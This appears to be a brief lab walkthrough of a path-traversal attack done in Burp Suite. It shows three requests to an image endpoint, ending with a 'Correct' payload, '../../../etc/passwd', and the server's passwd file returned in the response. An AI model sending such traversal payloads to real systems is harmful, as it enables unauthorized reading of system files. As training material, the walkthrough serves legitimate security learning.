BurpSuite Proxy -> Repeater

### 1
GET /image?filename=51.jpg HTTP/2
 =>
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 177003

ÿØÿá!Exif ... etc ...


### 2
GET /image?filename=/etc/passwd HTTP/2
 =>
 HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"No such file"


### 3 Correct
GET /image?filename=../../../etc/passwd HTTP/2
=>
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync ... etc ...
